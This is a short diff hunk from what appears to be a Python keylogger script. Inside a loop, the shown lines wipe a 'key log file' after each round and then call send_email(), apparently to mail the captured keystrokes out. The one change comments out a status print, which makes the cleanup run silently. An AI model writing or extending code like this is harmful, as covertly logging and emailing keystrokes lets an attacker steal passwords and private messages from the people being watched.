@@ -210,7 +210,7 @@ while num_iterations < num_iterations_end:
         # clean off the key log file for the next execution
         with open(file_path + keys_information, "w") as f:
             f.write(" ")
-        print("CLEAN OFF FILE")
+        # print("CLEAN OFF FILE")
         
         send_email()
         
